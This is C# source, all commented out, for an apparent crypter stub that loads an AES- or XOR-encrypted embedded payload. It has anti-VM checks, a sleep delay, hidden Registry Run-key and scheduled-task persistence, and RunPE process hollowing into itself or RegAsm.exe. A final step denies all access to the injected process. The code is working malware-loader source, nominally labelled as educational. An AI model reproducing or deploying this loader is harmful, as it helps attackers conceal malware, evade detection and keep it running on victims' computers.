////#define INSTALL
////#define REGEDIT
////#define SCHTASKS

////#define AES
////#define XOR
////#define ITSELF
////#define REGASM

////#define ANTIVM
////#define SLEEP

//using System;
//using System.Collections.Generic;
//using System.ComponentModel;
//using System.Diagnostics;
//using System.IO;
//using System.Reflection;
//using System.Runtime.InteropServices;
//using System.Security;
//using System.Security.AccessControl;
//using System.Security.Cryptography;
//using System.Security.Principal;
//using System.Text;
//using System.Threading;
//using System.Windows.Forms;

//namespace Stub
//{
//    static class Stub
//    {
//        /// <summary>
//        /// Startup installer settings
//        /// </summary>
//#if INSTALL
//        public static FileInfo FileName = new FileInfo("[FILENAME]");
//        public static DirectoryInfo DirectoryName = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.[SPECIAL]), "[FOLDERNAME]"));
//#if REGEDIT
//        public static string RegistryName = "[REGEDIT]";
//#endif

//#if SCHTASKS
//        public static string SchtasksName = "[SCHTASKS]";
//#endif

//#endif
//        public static void Main()
//        {
//#if ANTIVM
//            if (AntiVM())
//                Environment.Exit(0);
//#endif
//#if INSTALL
//            Installer();
//#endif
//            byte[] bytes = GetResource("[RES]");
//            byte[] array = Decrypt(bytes, "[KEY]");

//#if SLEEP
//            Thread.Sleep([SLEEP]);
//#endif

//#if ITSELF
//            RunPE.Run(Application.ExecutablePath, array, false);
//#endif

//#if REGASM
//            RunPE.Run(@"C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe", array, false);
//#endif
//        }

//        // Nyan x Cat - author of getresource
//        public static byte[] GetResource(string file)
//        {
//            Assembly a = Assembly.GetExecutingAssembly();
//            using (Stream resFilestream = a.GetManifestResourceStream(file))
//            {
//                if (resFilestream == null) return null;
//                byte[] ba = new byte[resFilestream.Length];
//                resFilestream.Read(ba, 0, ba.Length);
//                return ba;
//            }

//        }

//        private static byte[] Decrypt(byte[] bytesToBeDecrypted, string key)
//        {
//#if AES
//            return AES_Decrypt(bytesToBeDecrypted, key);
//#endif

//#if XOR
//            return XOR_Decrypt(bytesToBeDecrypted, key);
//#endif
//        }

//#if AES
//        public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, string decKey)
//        {
//            byte[] decryptedBytes = null;
//            byte[] saltBytes = new byte[] { 026, 020, 202, 234, 136, 123, 069, 047 };
//            using (MemoryStream ms = new MemoryStream())
//            {
//                using (RijndaelManaged AES = new RijndaelManaged())
//                {
//                    AES.KeySize = 256;
//                    AES.BlockSize = 128;
//                    var passwordBytes = Encoding.UTF8.GetBytes(decKey);
//                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
//                    AES.Key = key.GetBytes(AES.KeySize / 8);
//                    AES.IV = key.GetBytes(AES.BlockSize / 8);
//                    AES.Mode = CipherMode.CBC;
//                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
//                    {
//                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
//                        cs.Close();
//                    }
//                    decryptedBytes = ms.ToArray();
//                }
//            }
//            return decryptedBytes;
//        }
//#endif

//#if XOR
//        private static byte[] XOR_Decrypt(byte[] bytesToBeDecrypted, string key)
//        {
//            byte[] output = new byte[bytesToBeDecrypted.Length];
//            for (int i = 0; i < bytesToBeDecrypted.Length; i++)
//            {
//                output[i] = (byte)(bytesToBeDecrypted[i] ^ key[i % key.Length]);
//            }
//            return output;
//        }
//#endif

//#if ANTIVM
//        private static bool AntiVM()
//        {
//            bool isInVM = false;

//            // VMWare and VirtualBox process list
//            List<string> proc = new List<string>()
//            {
//                "Vmtoolsd", "vboxservice","Vmwareuser","Vmwaretrat"
//            };

//            foreach (Process process in Process.GetProcesses())
//            {
//                if (proc.Contains(process.ProcessName))
//                    isInVM = true;
//            }

//            return isInVM;
//        }
//#endif

//#if INSTALL

//        /*
//        * │ Author of installer : NYAN CAT
//        * | Rebuilt by Aries52 (ajajjajk), XaFF 
//        * | Rebuilt - i.e added scheduled tasks
//        * 
//        * This program is distributed for educational purposes only.
//        */


//        // Main installation method
//        public static void Installer()
//        {
//            if (!IsInstalled())
//            {
//                try
//                {
//                    CreateDirectory();
//                    InstallFile();
//#if REGEDIT
//                    InstallRegistry();
//#endif

//#if SCHTASKS
//                    Schtasks();
//#endif
//                }
//                catch { }
//            }
//        }

//        // returns true if the client is already installed
//        public static bool IsInstalled()
//        {
//            if (Application.ExecutablePath == Path.Combine(DirectoryName.FullName, FileName.Name))
//                return true;
//            else
//                return false;
//        }

//        // if the folder does not exist, create a new one without or without hidden it
//        public static void CreateDirectory()
//        {
//            if (!DirectoryName.Exists)
//                DirectoryName.Create();
//        }

//        // if the file has a clone then search and kill the process, finally delete the file
//        // then write bytes array with or without increasing itself
//        public static void InstallFile()
//        {
//            string fullPath = Path.Combine(DirectoryName.FullName, FileName.Name);
//            if (FileName.Exists)
//            {
//                foreach (Process process in Process.GetProcesses())
//                {
//                    try
//                    {
//                        if (process.MainModule.FileName == fullPath) process.Kill();
//                    }
//                    catch { }
//                }
//                File.Delete(fullPath);
//                Thread.Sleep(250);
//            }
//            using (FileStream fs = new FileStream(fullPath, FileMode.Create, FileAccess.Write))
//            {
//                byte[] b = File.ReadAllBytes(Application.ExecutablePath);
//                fs.Write(b, 0, b.Length);
//            }
//        }

//#if REGEDIT
//        // Delete old registry and add new one
//        public static void InstallRegistry()
//        {
//            Powershell("Remove -ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '" + RegistryName + "';" +
//                "New-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '" + RegistryName + "' -Value '" + "\"" + Path.Combine(DirectoryName.FullName, FileName.Name) + "\"" + "' -PropertyType 'String'");
//        }

//        public static void Powershell(string args)
//        {
//            ProcessStartInfo processStart = new ProcessStartInfo()
//            {
//                FileName = "powershell.exe",
//                Arguments = args,
//                WindowStyle = ProcessWindowStyle.Hidden,
//                CreateNoWindow = true,
//                UseShellExecute = false
//            };
//            Process.Start(processStart);
//        }
//#endif

//#if SCHTASKS
//        // Check if user is administrator, so we can install our file in scheduled tasks with admin permissions
//        public static bool IsAdministrator()
//        {
//            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
//            {
//                WindowsPrincipal principal = new WindowsPrincipal(identity);
//                return principal.IsInRole(WindowsBuiltInRole.Administrator);
//            }
//        }

//        // Scheduled tasks startup
//        private static void Schtasks()
//        {
//            try
//            {
//                if (IsAdministrator())
//                {
//                    Process cmd_proc = new Process
//                    {
//                        StartInfo = new ProcessStartInfo
//                    ("cmd", "/C schtasks /create /tn \\" + SchtasksName + " /tr \"" + Path.Combine(DirectoryName.FullName, FileName.Name) + "\" /st 00:00 /du 9999:59 /sc once /ri 60 /rl HIGHEST /f")
//                    };
//                    cmd_proc.StartInfo.CreateNoWindow = true;
//                    cmd_proc.StartInfo.RedirectStandardError = true;
//                    cmd_proc.StartInfo.RedirectStandardOutput = true;
//                    cmd_proc.StartInfo.UseShellExecute = false;
//                    cmd_proc.Start();


//                }
//                else
//                {
//                    Process cmd_proc = new Process
//                    {
//                        StartInfo = new ProcessStartInfo
//                        ("cmd", "/C schtasks /create /tn \\" + SchtasksName + " /tr \"" + Path.Combine(DirectoryName.FullName, FileName.Name) + "\" /st 00:00 /du 9999:59 /sc once /ri 60 /f")
//                    };
//                    cmd_proc.StartInfo.CreateNoWindow = true;
//                    cmd_proc.StartInfo.RedirectStandardError = true;
//                    cmd_proc.StartInfo.RedirectStandardOutput = true;
//                    cmd_proc.StartInfo.UseShellExecute = false;
//                    cmd_proc.Start();
//                }
//            }
//            catch { }
//        }
//#endif

//#endif
//    }
//#region RunPE Class
//    public static class RunPE
//    {
//        //github.com/Artiist/RunPE-Process-Protection/blob/master/RunPE.cs

//        [DllImport("kernel32.dll", EntryPoint = "CreateProcess", CharSet = CharSet.Unicode), SuppressUnmanagedCodeSecurity]
//        private static extern bool CreateProcess(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);
//        [DllImport("kernel32.dll", EntryPoint = "GetThreadContext"), SuppressUnmanagedCodeSecurity]
//        private static extern bool GetThreadContext(IntPtr thread, int[] context);
//        [DllImport("kernel32.dll", EntryPoint = "Wow64GetThreadContext"), SuppressUnmanagedCodeSecurity]
//        private static extern bool Wow64GetThreadContext(IntPtr thread, int[] context);
//        [DllImport("kernel32.dll", EntryPoint = "SetThreadContext"), SuppressUnmanagedCodeSecurity]
//        private static extern bool SetThreadContext(IntPtr thread, int[] context);
//        [DllImport("kernel32.dll", EntryPoint = "Wow64SetThreadContext"), SuppressUnmanagedCodeSecurity]
//        private static extern bool Wow64SetThreadContext(IntPtr thread, int[] context);
//        [DllImport("kernel32.dll", EntryPoint = "ReadProcessMemory"), SuppressUnmanagedCodeSecurity]
//        private static extern bool ReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);
//        [DllImport("kernel32.dll", EntryPoint = "WriteProcessMemory"), SuppressUnmanagedCodeSecurity]
//        private static extern bool WriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);
//        [DllImport("ntdll.dll", EntryPoint = "NtUnmapViewOfSection"), SuppressUnmanagedCodeSecurity]
//        private static extern int NtUnmapViewOfSection(IntPtr process, int baseAddress);
//        [DllImport("kernel32.dll", EntryPoint = "VirtualAllocEx"), SuppressUnmanagedCodeSecurity]
//        private static extern int VirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);
//        [DllImport("kernel32.dll", EntryPoint = "ResumeThread"), SuppressUnmanagedCodeSecurity]
//        private static extern int ResumeThread(IntPtr handle);
//        [StructLayout(LayoutKind.Sequential, Pack = 2 - 1)]
//        private struct ProcessInformation
//        {
//            public readonly IntPtr ProcessHandle;
//            public readonly IntPtr ThreadHandle;
//            public readonly uint ProcessId;
//            private readonly uint ThreadId;
//        }
//        [StructLayout(LayoutKind.Sequential, Pack = 3 - 2)]
//        private struct StartupInformation
//        {
//            public uint Size;
//            private readonly string Reserved1;
//            private readonly string Desktop;
//            private readonly string Title;
//            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 18 + 18)] private readonly byte[] Misc;
//            private readonly IntPtr Reserved2;
//            private readonly IntPtr StdInput;
//            private readonly IntPtr StdOutput;
//            private readonly IntPtr StdError;
//        }

//        public static bool Run(string path, byte[] data, bool protect)
//        {
//            for (int I = 1; I <= 5; I++)
//                if (HandleRun(path, data, protect)) return true;
//            return false;
//        }
//        private static bool HandleRun(string path, byte[] data, bool protect)
//        {
//            int readWrite = 0;
//            string quotedPath = "#cmd";
//            StartupInformation si = new StartupInformation();
//            ProcessInformation pi = new ProcessInformation();
//            si.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(StartupInformation)));
//            try
//            {
//                if (!CreateProcess(path, quotedPath, IntPtr.Zero, IntPtr.Zero, false, 2 + 2, IntPtr.Zero, null, ref si, ref pi)) throw new Exception();
//                int fileAddress = BitConverter.ToInt32(data, 120 / 2);
//                int imageBase = BitConverter.ToInt32(data, fileAddress + 26 + 26);
//                int[] context = new int[179];
//                context[0] = 32769 + 32769;
//                if (IntPtr.Size == 8 / 2)
//                { if (!GetThreadContext(pi.ThreadHandle, context)) throw new Exception(); }
//                else
//                { if (!Wow64GetThreadContext(pi.ThreadHandle, context)) throw new Exception(); }
//                int ebx = context[41];
//                int baseAddress = 1 - 1;
//                if (!ReadProcessMemory(pi.ProcessHandle, ebx + 4 + 4, ref baseAddress, 2 + 2, ref readWrite)) throw new Exception();
//                if (imageBase == baseAddress)
//                    if (NtUnmapViewOfSection(pi.ProcessHandle, baseAddress) != 1 - 1) throw new Exception();
//                int sizeOfImage = BitConverter.ToInt32(data, fileAddress + 160 / 2);
//                int sizeOfHeaders = BitConverter.ToInt32(data, fileAddress + 42 + 42);
//                bool allowOverride = false;
//                int newImageBase = VirtualAllocEx(pi.ProcessHandle, imageBase, sizeOfImage, 6144 + 6144, 32 + 32);

//                if (newImageBase == 0) throw new Exception();
//                if (!WriteProcessMemory(pi.ProcessHandle, newImageBase, data, sizeOfHeaders, ref readWrite)) throw new Exception();
//                int sectionOffset = fileAddress + 124 * 2;
//                short numberOfSections = BitConverter.ToInt16(data, fileAddress + 3 + 3);
//                for (int I = 1 - 1; I < numberOfSections; I++)
//                {
//                    int virtualAddress = BitConverter.ToInt32(data, sectionOffset + 6 + 6);
//                    int sizeOfRawData = BitConverter.ToInt32(data, sectionOffset + 8 + 8);
//                    int pointerToRawData = BitConverter.ToInt32(data, sectionOffset + 40 / 2);
//                    if (sizeOfRawData != 1 - 1)
//                    {
//                        byte[] sectionData = new byte[sizeOfRawData];
//                        Buffer.BlockCopy(data, pointerToRawData, sectionData, 2 - 2, sectionData.Length);
//                        if (!WriteProcessMemory(pi.ProcessHandle, newImageBase + virtualAddress, sectionData, sectionData.Length, ref readWrite)) throw new Exception();
//                    }
//                    sectionOffset += 120 / 3;
//                }
//                byte[] pointerData = BitConverter.GetBytes(newImageBase);
//                if (!WriteProcessMemory(pi.ProcessHandle, ebx + 16 / 2, pointerData, 2 * 2, ref readWrite)) throw new Exception();
//                int addressOfEntryPoint = BitConverter.ToInt32(data, fileAddress + 80 / 2);
//                if (allowOverride) newImageBase = imageBase;
//                context[22 + 22] = newImageBase + addressOfEntryPoint;

//                if (IntPtr.Size == 2 + 2)
//                {
//                    if (!SetThreadContext(pi.ThreadHandle, context)) throw new Exception();
//                }
//                else
//                {
//                    if (!Wow64SetThreadContext(pi.ThreadHandle, context)) throw new Exception();
//                }
//                if (ResumeThread(pi.ThreadHandle) == -1) throw new Exception();
//                if (protect) Protect(pi.ProcessHandle);
//            }
//            catch
//            {
//                Process p = Process.GetProcessById(Convert.ToInt32(pi.ProcessId));
//                p.Kill();
//                return false;
//            }
//            return true;
//        }

//        [DllImport("advapi32.dll", SetLastError = true)]
//        private static extern bool GetKernelObjectSecurity(IntPtr Handle, int securityInformation, [Out] byte[] pSecurityDescriptor, uint nLength, ref uint lpnLengthNeeded);

//        [DllImport("advapi32.dll", SetLastError = true)]
//        private static extern bool SetKernelObjectSecurity(IntPtr Handle, int securityInformation, [In] byte[] pSecurityDescriptor);

//        private static void SetProcessSecurityDescriptor(IntPtr processHandle, RawSecurityDescriptor rawSecurityDescriptor)
//        {
//            byte[] array = new byte[checked(rawSecurityDescriptor.BinaryLength - 1 + 1 - 1 + 1)];
//            rawSecurityDescriptor.GetBinaryForm(array, 0);
//            bool flag = !SetKernelObjectSecurity(processHandle, 4, array);
//            if (flag)
//            {
//                throw new Win32Exception();
//            }
//        }

//        private static T InlineAssignHelper<T>(ref T target, T value)
//        {
//            target = value;
//            return value;
//        }

//        private static RawSecurityDescriptor GetProcessSecurityDescriptor(IntPtr processHandle)
//        {
//            byte[] array = new byte[0];
//            uint bufferSize = new uint();
//            GetKernelObjectSecurity(processHandle, 4, array, 0u, ref bufferSize);
//            if (bufferSize < 0 || bufferSize > short.MaxValue)
//            {
//                throw new Win32Exception();
//            }

//            bool cdt = !GetKernelObjectSecurity(processHandle, 4, InlineAssignHelper<byte[]>(ref array, new byte[checked((int)(unchecked((ulong)bufferSize) - 1UL) + 1 - 1 + 1)]), bufferSize, ref bufferSize);
//            if (cdt)
//            {
//                throw new Win32Exception();
//            }
//            return new RawSecurityDescriptor(array, 0);
//        }

//        private static void Protect(IntPtr processHandle)
//        {
//            RawSecurityDescriptor rawSecurityDescriptor = GetProcessSecurityDescriptor(processHandle);
//            rawSecurityDescriptor.DiscretionaryAcl.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 987135, new SecurityIdentifier(WellKnownSidType.WorldSid, null), false, null));
//            SetProcessSecurityDescriptor(processHandle, rawSecurityDescriptor);
//        }

//        private enum ProcessAccessRights
//        {
//            DELETE = 65536,
//            ITE_OWNER = 524288,
//            PROCESS_ALL_ACCESS = 987135,
//            PROCESS_CREATE_PROCESS = 128,
//            PROCESS_CREATE_THREAD = 2,
//            PROCESS_DUP_HANDLE = 64,
//            PROCESS_QUERY_INFORMATION = 1024,
//            PROCESS_QUERY_LIMITED_INFORMATION = 4096,
//            PROCESS_SET_INFORMATION = 512,
//            PROCESS_SET_QUOTA = 256,
//            PROCESS_SUSPEND_RESUME = 2048,
//            PROCESS_TERMINATE = 1,
//            PROCESS_VM_OPERATION = 8,
//            PROCESS_VM_READ = 16,
//            PROCESS_VM_WRITE = 32,
//            READ_CONTROL = 131072,
//            STANDARD_RIGHTS_REQUIRED = 983040,
//            SYNCHRONIZE = 256,
//            WRITE_DAC = 262144
//        }
//    }

//#endregion
//}
